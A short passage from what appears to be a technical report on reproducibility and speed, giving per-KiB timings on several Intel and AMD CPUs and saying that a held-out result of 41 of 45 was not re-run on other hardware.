still not shown, since no run has looked at which kernels were chosen. The
published figures stay as measured, the Xeons' are reported beside them,
and the held-out figure (41 of 45) is not re-run on any other CPU. Speed
differs a great deal more than the names: 308–332 ms per KiB on the
i5-12450H under Windows, 450.7 on it under Linux with 4 CPUs, 292.1 on the
EPYC and 147.0 on the Xeon.
